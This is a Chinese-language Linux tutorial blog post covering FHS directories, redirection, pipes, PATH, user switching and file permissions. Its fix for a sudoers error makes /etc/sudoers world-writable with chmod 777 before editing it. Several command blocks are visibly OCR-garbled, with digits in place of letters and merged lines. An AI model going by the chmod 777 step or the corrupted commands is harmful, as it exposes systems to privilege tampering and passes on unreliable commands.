title="Linux重定向管道命令环境变量PATH"></a>Linux重定向管道命令环境变量PATH</h2><h3 id="Linux目录配置标准FHS"><a href="#Linux目录配置标准FHS" class="headerlink" title="Linux目录配置标准FHS"></a>Linux目录配置标准FHS</h3><p>是什么?</p><p>FHS本质一套规定Linux目录结构，软件建议安装位置的标准<br>为什么?</p><p>使用Linux来开发产品或者发布软件的公司、个人太多，如果每家公司或者个人都按照自己的意愿来配置文件或者软件的存放位置，这无疑是一场灾难。我们可不想学完我们的Linux之后，去公司发现看不懂别人的目录结构，更别谈开发了。<br>怎么办?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入根目录</span><br><span class="line">[root@1ocalhost home]# cd /</span><br><span class="line">#查看目录树(两层，只看目录，不看文件)</span><br><span class="line">[root@localhost /]# tree -d -L 1</span><br><span class="line">.</span><br><span class="line">|- bin -&gt; usr/bin #可执行文件目录，linux白带命令在这里</span><br><span class="line">|- boot #开机会使用到的文件，包括活Linux核心文件以及开机菜单与开机所需配置文件等等。</span><br><span class="line">|- dev #设备目录</span><br><span class="line">|- etc #配置文件几乎都放宣在这个自录内，例如人员的帐号密码档、各种服务的启始档等等</span><br><span class="line">|- home #家目录，系统默认的使用者主文件夹，用户的个人文件都可放在这里</span><br><span class="line">|-lib -&gt; usr/lib #放置在开机时会用到的函数库，以及在/bin或/sbin下面的指令会调用的l函数库l</span><br><span class="line">|-lib64 -&gt; usr /lib64#与lib类似</span><br><span class="line">|- media #放置可移除的设备，包括软盘、光盘、DVD等等设备都暂时挂载于此。</span><br><span class="line">|- mnt #设备临时挂载目录</span><br><span class="line">|─ opt #第三方协力软件放置的目录</span><br><span class="line">|- proc #是一个虚拟文件系统，放置内存中的数据，不占用硬盘空间</span><br><span class="line">|- root #系统管理员的主文件夹</span><br><span class="line">|- run#放置系统开机后所产生的各项信息</span><br><span class="line">|- sbin -&gt; usr/sbin #里面包括了开机、修复、还原系统所需要的指令，root用户使用</span><br><span class="line">|- srv #service是一些网络服务启动之后，这些服务所需要取用的数据目录。</span><br><span class="line">|—- sys #与proc类似</span><br><span class="line">|- tmp #temp,让一般使用者或者是正在执行的程序暂时放置文件的地方</span><br><span class="line">|- usr #unix software resource:与软件安装/执行有关</span><br><span class="line">|- var #variable,与系统运行过程有关,主要为变动性较大的数据</span><br><span class="line">10diro-torioc</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917"><a href="#linux目录结构详细说明–基于FHS与CentOS7-0-文章链接-https-blog-csdn-net-lzq00277-article-details-108303917" class="headerlink" title="linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][https://blog.csdn.net/lzq00277/article/details/108303917]"></a>linux目录结构详细说明–基于FHS与CentOS7.0[文章链接][<a href="https://blog.csdn.net/lzq00277/article/details/108303917]">https://blog.csdn.net/lzq00277/article/details/108303917]</a></h4><h3 id="Linux数据重定向的理解与操作"><a href="#Linux数据重定向的理解与操作" class="headerlink" title="Linux数据重定向的理解与操作"></a>Linux数据重定向的理解与操作</h3><h4 id="基本准备"><a href="#基本准备" class="headerlink" title="基本准备"></a>基本准备</h4><p>基本大部分计算机，要与人交互，都要默认打开三个设备(文件)</p><ul><li>标准输入，stdin，代码是0</li><li>标准输出，stdout，代码是1</li><li>标准错误输出，stderr，代码是2</li></ul><p>为什么?</p><p> Linux一切皆文件，交互需求，输入输出信息分类<br>除了上面的三个标准设备(文件)，我们可能经常有从文件读取数据,或者将数据写入文件的场景</p><h4 id="重定向的理解"><a href="#重定向的理解" class="headerlink" title="重定向的理解"></a>重定向的理解</h4><p>是什么?</p><ul><li>输出&#x2F;追加重定向:本来应该显示到显示器(通常)文件的内容，写入到文件当中。</li><li>输入重定向:或者本来应该从显示器(通常)文件读取数据，转化成从指定文件读取数据</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost test1]# touch file1 file2 file3</span><br><span class="line">[root@localhost test1]# ls   #当前只有三个文件</span><br><span class="line">file1  file2  file3</span><br><span class="line">[root@localhost test1]# whoami #该命令输出的结果,默认是直接打印到标准输出的stdout文件中</span><br><span class="line">root</span><br><span class="line">[root@localhost test1]# whoami&gt;file4 #输出重定向,不在显示出来</span><br><span class="line">[root@localhost test1]# ll #新创建文件file4</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file1</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root 0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 5 Oct 31 07:47 file4</span><br><span class="line">[root@localhost test1]# cat file4 #本来应该显示到显示器的内容, 写到了file4文件中</span><br><span class="line">root</span><br><span class="line">#追加重定向</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot;&gt;file4 #将新内容重定向到文件file4中</span><br><span class="line">[root@localhost test1]# cat file4 #发现之前的root被覆盖了</span><br><span class="line">hello bit</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit&quot; &gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #连续重定向多此,发现文件内容并无变化</span><br><span class="line">hello bit 其实并不是没有变化,而是每次写入都是重头开始</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit2&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# echo &quot;hello bit1&quot; &gt;&gt; file4</span><br><span class="line">[root@localhost test1]# cat file4 #通过多此&gt;&gt;,我们发现内容是被追加到文件结尾的,叫做追加重定向</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">#输入重定向</span><br><span class="line">[root@localhost test1]# cat &gt; file1</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">besd^Ht^H^H^H^[[4~^[[4~ #ctrl+d结束,Delete键不能删除</span><br><span class="line">[root@localhost test1]# cat file1 #可以看出,如果cat后面没有紧跟数据源文件,默认从标准输入获取数据</span><br><span class="line">hello</span><br><span class="line">bit</span><br><span class="line">best</span><br><span class="line">[root@localhost test1]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r--. 1 root root 28 Oct 31 07:50 file1</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file2</span><br><span class="line">-rw-r--r--. 1 root root  0 Oct 31 07:46 file3</span><br><span class="line">-rw-r--r--. 1 root root 43 Oct 31 07:48 file4</span><br><span class="line">[root@localhost test1]# cat file4</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 #既然cat要打印文件,前提也是先读取file4,所以也可以这样写</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br><span class="line">[root@localhost test1]# cat &lt; file4 &gt; file3 #读取再写入</span><br><span class="line">[root@localhost test1]# cat file3</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">[root@localhost test1]# cat file4 #原数据保留</span><br><span class="line">hello bit</span><br><span class="line">hello bit1</span><br><span class="line">hello bit2</span><br><span class="line">hello bit1</span><br></pre></td></tr></table></figure><p>cat &gt;输入时键盘的删除键也会被读入,虽然再次cat不显示,但内存不一样,可以用vi看出来</p><p>代码0,1,2?是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.cfind: &#x27; /home/w1&#x27;: Permission denied #报错信息</span><br><span class="line">/home/wudu/work/linux-57/1inux-1esson7/signal_test/test.c#正常信息/home/wudu/work/1inux-57/1inux-1esson7/sigaction_test/test.c#正常信息...</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c &gt; test_list #发现并不是所有信息都被重定向find: &#x27; /home/w1 &#x27;: Permission denied</span><br><span class="line">#报错信息并没有被写入目标文件</span><br><span class="line">[whb@vM-O-3-centos test]$ cat test_list</span><br><span class="line">/home/wudu/work/1inux-57/1inux-1esson7/signal_test/test.c#正常信息被写入了/home/wudu/work /1inux-57/1inux-lesson7/sigaction_test/test.c</span><br><span class="line">...</span><br><span class="line">#1:代表标准输出#2:代表标准错误</span><br><span class="line"># 但是他们两个默认都会往显示器打印，像上面的情况，打印输出到显示器会发生混乱</span><br><span class="line">#只打印正常信息</span><br><span class="line">[whb@VM-O-3-centos test]$ find /home -name test.c 2&gt;err.list/home/wudu/work/linux-57/1inux-lesson7/signal_test/test.c/home/wudu/work/linux-57/linux-lesson7/sigaction_test/test.c/home/wudu/work/1inux-57/linux-lesson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/linux-57/linux-1esson15/test/test.c/home/wudu/work / linux-57/1inux-1esson4/pipesize/test.c/home/wudu/work/linux-57/1inux-lesson5/testmkfifo/test.c/home/wudu/work / linux-57/linux-lesson5/shmtest/test.c/home/wudu/work / linux-57/1inux-lesson3/dynamic/test.c/home/wudu/work/linux-57/linux-lesson3 /static/test.c...</span><br><span class="line">[whb@vM-O-3-centos test]$ cat err.list #错误信息被单独分离出来find: ‘/home/w1’ : Permission denied</span><br><span class="line">find: &#x27; /home/sly&#x27;: Permission deniedfind: ‘ /home/zwc&#x27;: Permission deniedfind: ‘/home/cpx&#x27;: Permission denied</span><br><span class="line">然</span><br><span class="line">find: ‘ /home/gb&#x27;: Permission denied</span><br><span class="line">find: &#x27; /home/bss&#x27;: Permission denied</span><br><span class="line">#只打印错误信息</span><br><span class="line">#上面默认就是</span><br><span class="line">#正常和错误信息都重定向到文件中</span><br><span class="line">[whb@vM-O-3-centos test]$ find /home -name test,c &gt;info.list 2&gt;&amp;1[whb@vM-O-3-centos test]$ cat info.7ist</span><br><span class="line">find: &#x27; /home/wl’ : Permission denied</span><br><span class="line">find: &#x27; /home/wudu/ . local&#x27; : Permission denied</span><br><span class="line">/home/wudu/work/linux-57/linux-lesson7/sighal test/test.c/home/wudu/work/linux-57/linux-lesson7[sigaction_test/test.c/home/wudu/work/linux-57/1inux -Pesson7 sigmask/test.c</span><br><span class="line">...</span><br><span class="line">#2&gt;&amp;1??又是什么鬼?这个底层是怎么实现的。目前还不能讲，比特后期的课程才有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显示器中的输出信息有错误的也有正确得,大于(&gt;)只把正确的写入,即只重定向标准输出,如果要都打印进去,在命令后面加上2&gt;&amp;1即可</p><h4 id="x2F-dev-x2F-null"><a href="#x2F-dev-x2F-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h4><p>垃圾桶黑洞设备，如果我知道有错误信息，但是我不想要，我想凡是错误信息直接丢弃，习惯写法是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[whb@vM-O-3-centos test]$ find /home -name test.c 2&gt;/dev/nu11#便只显示正常信息了/home/wudu/work/linux-57/linux-lesson7/signal_test/test.c</span><br><span class="line">/home/wudu/work/1inux-57/linux-lesson7/sigaction_test/test.c/ home/wudu/work/linux-57/linux-1esson7/sigmask/test.c</span><br><span class="line">/home/wudu/work/ linux-57/linux-1esson15/test/test.c/home/wudu/work/linux-57/1inux-lesson4/pipesize/test.c/home/wudu/work/linux-57/linux-1esson5/testmkfifo/test.c</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Linux管道命令的理解和操作"><a href="#Linux管道命令的理解和操作" class="headerlink" title="Linux管道命令的理解和操作"></a>Linux管道命令的理解和操作</h3><p>命令是可以产生数据的，如果我们还要多输出数据进行加工，甚至想多次加工，就需要使用管道</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# last #显示正在或者最近登陆linux的用户信息</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:06  (04:16)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">(unknown :0           :0               Mon Oct 30 20:00 - crash  (08:49)    </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Mon Oct 30 20:00 - 09:06  (13:05) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到5条信息呢 </span><br><span class="line">[root@localhost ~]# last | head -5 #其中&quot;|&quot;就是管道,head时一个获取文本行的工具,可以单独介绍</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">(unknown :0           :0               Tue Oct 31 04:50   still logged in   </span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Tue Oct 31 04:49 - 09:07  (04:17) </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我(root)的登陆历史信息呢?</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot;</span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 06:45   still logged in   </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 31 06:34 - 06:45  (00:11)    </span><br><span class="line">root     pts/0        192.168.174.1    Tue Oct 31 04:51 - 06:34  (01:43)    </span><br><span class="line">root     pts/0        192.168.174.1    Mon Oct 30 20:01 - crash  (08:48)    </span><br><span class="line">root     pts/1        192.168.174.1    Tue Oct 24 04:38 - 04:38  (00:00)    </span><br><span class="line">root     pts/0        :0               Tue Oct 24 04:30 - 04:39  (00:08)    </span><br><span class="line">root     :0           :0               Tue Oct 24 04:30 - 04:39  (00:08)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#如果我只想看到我的历史登陆时间?要用到awk</span><br><span class="line">[root@localhost ~]# last | grep &quot;root&quot; | awk &#x27;&#123;print $1,$4,$5,$6,$7&#125;&#x27;</span><br><span class="line">root Tue Oct 31 06:45</span><br><span class="line">root Tue Oct 31 06:34</span><br><span class="line">root Tue Oct 31 04:51</span><br><span class="line">root Mon Oct 30 20:01</span><br><span class="line">root Tue Oct 24 04:38</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Tue Oct 24 04:30</span><br><span class="line">root Mon Oct 23 19:08</span><br><span class="line">root Tue Jul 25 01:33</span><br><span class="line">root Tue Jul 25 01:32</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:14</span><br><span class="line">root Tue Jul 25 01:09</span><br><span class="line">root Tue Nov 16 21:07</span><br></pre></td></tr></table></figure><p>可见，管道是可以级联多条命令的，每条命令的结果输出，都作为输入，导入下一条命令。有点像流水线</p><p><img src="/../image/image-20231101001146154.png" alt="image-20231101001146154"></p><p>理论上，管道的基本操作就完了，实际上，如果站在日常使用就够了，但是如果想面试大厂，至少有两方面问题需要深究?</p><ul><li>除了上面的文本处理工具，还有哪些文本处理工具你都使用过，各自有什么特征?·</li><li>站在操作系统层面，管道的底层原理是什么?</li></ul><h3 id="Linux环境变量与PATH"><a href="#Linux环境变量与PATH" class="headerlink" title="Linux环境变量与PATH"></a>Linux环境变量与PATH</h3><p>假设我们用c写一个输出hello world!的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat test.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# gcc -o mycmd test.c</span><br><span class="line">[root@localhost ~]# ./mycmd</span><br><span class="line">hello world</span><br><span class="line">#./也可以认为是一种命令</span><br><span class="line">#想ls,就在/bin/ls or/usr/bin/ls,为什么执行的时候可以不带路径呢</span><br></pre></td></tr></table></figure><p>环境变量PATH<br>是一个路径集，命令再被执行时，系统会在环境变量PATH中进行路径查找，如果找到，就停止查找，执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo $PATH #不同环境,平台的内容可能不同</span><br><span class="line">/usr/local/soft/java/jdk1.8.0_40/bin:/usr/local/soft/java/jdk1.8.0_40/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">$:用来显示PATH环境变量的内容</span><br><span class="line">#各个路径以:作为分隔符,每个区域代表一个搜索路径</span><br></pre></td></tr></table></figure><p>这也就解释了，为何ls不需要带路径，因为ls所在的路径，本身就在PATH环境变量列表当中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# which ls</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">/usr/bin/ls</span><br></pre></td></tr></table></figure><p>那么问题来了，我也想让我的’hello world’程序执行的时候不带.&#x2F;这样的路径,怎么办呢?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#方法一</span><br><span class="line">[whb@vM-O-3-centos test]$ mycmd-bash: mycmd: command not found</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo cp mycmd /usr/bin[sudo] password for whb:</span><br><span class="line">[whb@vM-O-3-centos test]$ 1s /usr/bin/mycmd/usr/bin/mycmd</span><br><span class="line">[whb@VM-O-3-centos test]$ mycmd#但是千万不要这样干，因为会‘污染&#x27;指令集he1lo wor1d</span><br><span class="line">#方法二</span><br><span class="line">[whb@vM-O-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/loca1/jdk8/jre/bin:/usr/loca1/bin:/usr/bin: [usr/Toca1/sbin:/usr/sbin : /home/whb / .1oca1/bin : /home/whb/bin</span><br><span class="line">[whb@vM-O-3-centos test]$ pwd#查看自己当前处于哪个目录/home/whb/test</span><br><span class="line">[whb@VM-0-3-centos test]s export PATH=$PATH:/home/whb/test#导出新的环境变量，加上程序所在的路径[whb@vM-0-3-centos test]$ echo $PATH</span><br><span class="line">/usr/loca1/jdk8/bin:/usr/local/jdk8/jre/bin;/eseloca1/bin:/usr/bin:/usr/local/sbin:/usr/sbin : /home/whb / .loca1/bin:/home/whb/bin : / home/vwhb/tes t</span><br><span class="line">[whb@vM-O-3-centos test]$ sudo rm /usr/bin/mycmd#删掉在/usr/bin路径下的可执行程序[whb@vM-O-3-centos test]$ which myemd #mycmdt经能通过环境变量被找到</span><br><span class="line">~/test/mycmd</span><br><span class="line">[whb@vM-0-3-centos test]$ mycmd就可以不带路径he1lo wor1d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在思考一下，几乎可以得出如下结论;</p><ul><li>系统本身会提供某种全局育找属性，帮我们找到特定的模块&#x2F;程序</li></ul><p>其实，编译器内部也有类似的功能，想想，为何我们#includec头文件&gt;,并没有指明头文件在哪里，但是编译器也能帮我们找到并展开，包括我们也并没有指明我们的程序依赖哪些第三方库，编译器也能找到。</p><h3 id="插话-vim编辑器里Tab键缩进不是4个空格怎么调"><a href="#插话-vim编辑器里Tab键缩进不是4个空格怎么调" class="headerlink" title="插话,vim编辑器里Tab键缩进不是4个空格怎么调"></a>插话,vim编辑器里Tab键缩进不是4个空格怎么调</h3><ul><li><p>第一步,找到vimrc文件所在位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># find / -name vimrc</span><br></pre></td></tr></table></figure></li><li><p>第二步: 找到以后用vim打开vimrc文件并增加下面两行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set ts=4</span><br><span class="line">set expandtab</span><br></pre></td></tr></table></figure><p>加在set ruler或即可</p><p><img src="/../image/image-20231101002709400.png" alt="image-20231101002709400"></p></li></ul><h2 id="Linux权限理解"><a href="#Linux权限理解" class="headerlink" title="Linux权限理解"></a>Linux权限理解</h2><p><a href="https://blog.csdn.net/ghjzzhg/article/details/94388439">linux中&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件详解</a>该文件可以用来限制密码强度，输入次数等，可提高安全性</p><h3 id="Linux用户的概念"><a href="#Linux用户的概念" class="headerlink" title="Linux用户的概念"></a>Linux用户的概念</h3><h4 id="Linux下有两种用户：超级用户（root）、普通用户"><a href="#Linux下有两种用户：超级用户（root）、普通用户" class="headerlink" title="Linux下有两种用户：超级用户（root）、普通用户"></a>Linux下有两种用户：超级用户（root）、普通用户</h4><ul><li>超级用户:可以再linux系统下做任何事情，不受限制</li><li>普通用户:在linux下做有限的事情。</li><li>超级用户的命令提示符是”#”，普通用户的命令提示符是”$”。</li></ul><h3 id="角色切换"><a href="#角色切换" class="headerlink" title="角色切换"></a>角色切换</h3><h4 id="普通用户切换超级用户"><a href="#普通用户切换超级用户" class="headerlink" title="普通用户切换超级用户"></a>普通用户切换超级用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[sudo] password for youzipii: </span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# </span><br></pre></td></tr></table></figure><h4 id="超级用户切换到普通用户"><a href="#超级用户切换到普通用户" class="headerlink" title="超级用户切换到普通用户"></a>超级用户切换到普通用户</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo -s</span><br><span class="line">[root@localhost youzipii]# whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost youzipii]# exit</span><br><span class="line">exit</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br></pre></td></tr></table></figure><h4 id="怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html"><a href="#怎么查看当前linux有多少用户-好文-https-www-cnblogs-com-will-wu-p-12937015-html" class="headerlink" title="怎么查看当前linux有多少用户[好文][https://www.cnblogs.com/will-wu/p/12937015.html]"></a>怎么查看当前linux有多少用户[好文][<a href="https://www.cnblogs.com/will-wu/p/12937015.html]">https://www.cnblogs.com/will-wu/p/12937015.html]</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | cut -f 1 -d :</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | cut -f 1 -d:</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">...</span><br><span class="line"># 注：| 是管道，把cat的输出传给cut处理；后面的cut取出每一行的以：分割的第一栏</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">...</span><br><span class="line">/etc/passwd 文件存放的是用户信息.由六个分号组成的7个信息,分别是:</span><br><span class="line">用户名 （magesh）： 已创建用户的用户名，字符长度 1 个到 12 个字符。</span><br><span class="line">密码（x）：代表加密密码保存在 `/etc/shadow 文件中。</span><br><span class="line">用户 ID（506）：代表用户的 ID 号，每个用户都要有一个唯一的 ID 。UID 号为 0 的是为 root 用户保留的，UID 号 1 到 99 是为系统用户保留的，UID 号 100-999 是为系统账户和群组保留的。</span><br><span class="line">群组 ID （507）：代表群组的 ID 号，每个群组都要有一个唯一的 GID ，保存在 /etc/group文件中。</span><br><span class="line">用户信息（2g Admin - Magesh M）：代表描述字段，可以用来描述用户的信息（LCTT 译注：此处原文疑有误）。</span><br><span class="line">家目录（/home/mageshm）：代表用户的家目录。</span><br><span class="line">Shell（/bin/bash）：代表用户使用的 shell 类型。</span><br></pre></td></tr></table></figure><h4 id="用户相关命令"><a href="#用户相关命令" class="headerlink" title="用户相关命令"></a>用户相关命令</h4><table><thead><tr><th>序号</th><th>命令</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>useradd -m -g 组 新建用户名</td><td>添加新用户</td><td>-m 自动建立用户家目录<br />-g 指定用户所在的组，否则会建立一个同名的组</td></tr><tr><td>2</td><td>passwd 用户名</td><td>设置用户密码</td><td>如果是普通用户，直接用passwd可以修改自己的账户密码</td></tr><tr><td>3</td><td>userdel -r 用户名</td><td>删除用户</td><td>-r 会自动删除用户家目录</td></tr><tr><td>4</td><td>cat &#x2F;etc&#x2F;passwd | grep 用户名</td><td>确认用户信息</td><td>新建用户后，用户的信息会保存在&#x2F;etc&#x2F;passwd文件中</td></tr><tr><td>5</td><td>usermod -g 组 用户名</td><td>让用户有某些权限</td><td></td></tr><tr><td>6</td><td>usermod -s &#x2F;bin&#x2F;bash</td><td>修改用户登陆SHell</td><td></td></tr></tbody></table><h4 id="报错-用户不在sudoers文件中"><a href="#报错-用户不在sudoers文件中" class="headerlink" title="报错(用户不在sudoers文件中)"></a>报错(用户不在sudoers文件中)</h4><p>在使用sudo -s命令时,出现以下情况</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">youzipii is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure><p>解决方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一步先su - 进入root模式</span><br><span class="line"># 第二步再去修改/etc/sudoers里的内容,在root下面加入用户名,其他与root一致</span><br><span class="line"># 但文件权限可能不够,需要先给权限</span><br><span class="line">[root@localhost ~]# chmod 777 /etc/sudoers</span><br><span class="line">[root@localhost ~]# vi /etc/sudoers</span><br><span class="line">...</span><br><span class="line">## Allow root to run any commands anywhere </span><br><span class="line">root    ALL=(ALL)   ALL</span><br><span class="line">youzipii ALL=(ALL)     ALL</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# chmod u-wx,o-wx,g-rwx /etc/sudoers</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另外，用户角色切换还有其他方式，还有很多细节.<br>还有，Linux是多用户的，所以可以同时登陆多人，甚至你可以切成别人的身份，但是目前我们的Linux机器，大都是自己使用，所以先不考虑这些。</p><h3 id="Linux权限管理"><a href="#Linux权限管理" class="headerlink" title="Linux权限管理"></a>Linux权限管理</h3><h4 id="文件访问者的分类"><a href="#文件访问者的分类" class="headerlink" title="文件访问者的分类"></a>文件访问者的分类</h4><ul><li>文件和文件目录的所有者:u—User</li><li>文件和文件目录的所有者所在的组的用户g—Group </li><li>其它用户:o—Others(外国人)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown 用户名 文件名|目录名 //修改文件拥有者</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文件类型和访问权限（事务属性）"><a href="#文件类型和访问权限（事务属性）" class="headerlink" title="文件类型和访问权限（事务属性）"></a>文件类型和访问权限（事务属性）</h4><p><img src="/../image/image-20231101185252874.png" alt="image-20231101185252874"></p><h4 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd 组名 sudo执行</span><br><span class="line">groupdel 组名 sudo执行</span><br><span class="line">cat /etc/group 确认组信息</span><br><span class="line">chgrp 组名 文件/目录名 修改文件/目录的所属组 加上-R参数可以递归修改</span><br></pre></td></tr></table></figure><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><ul><li>d:文件夹-︰普通文件</li><li>1∶软链接（类似windows的快捷方式)</li><li>b:块设备文件（例如硬盘、光驱等)</li><li>p:管道文件</li><li>c:字符设备文件（例如屏幕等串口设备)</li><li>s:套接口文件</li></ul><h4 id="file指令"><a href="#file指令" class="headerlink" title="file指令"></a>file指令</h4><p>功能说明：辨识文件类型</p><p>语法：file [选项] 文件或目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost home]$ cd youzipii/</span><br><span class="line">[youzipii@localhost ~]$ file ../youzipii/</span><br><span class="line">../youzipii/: directory</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: empty</span><br><span class="line">[youzipii@localhost ~]$ echo &quot;www.baidu.com&quot; &gt;&gt; youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ file youzipii.txt</span><br><span class="line">youzipii.txt: ASCII text</span><br></pre></td></tr></table></figure><h4 id="基本权限设置"><a href="#基本权限设置" class="headerlink" title="基本权限设置"></a>基本权限设置</h4><ul><li>读（r&#x2F;4) : Read对文件而言，具有读取文件内容的权限;对目录来说，具有浏览该目录信息的权限</li><li>写(w&#x2F;2) : Write对文件而言，具有修改文件内容的权限;对目录来说具有删除移动目录内文件的权限</li><li>执行(x&#x2F;1) : execute对文件而言，具有执行文件的权限;对目录来说，具有进入目录的权限</li><li>“—“表示不具有该项权限</li></ul><h4 id="文件权限值得表示方法"><a href="#文件权限值得表示方法" class="headerlink" 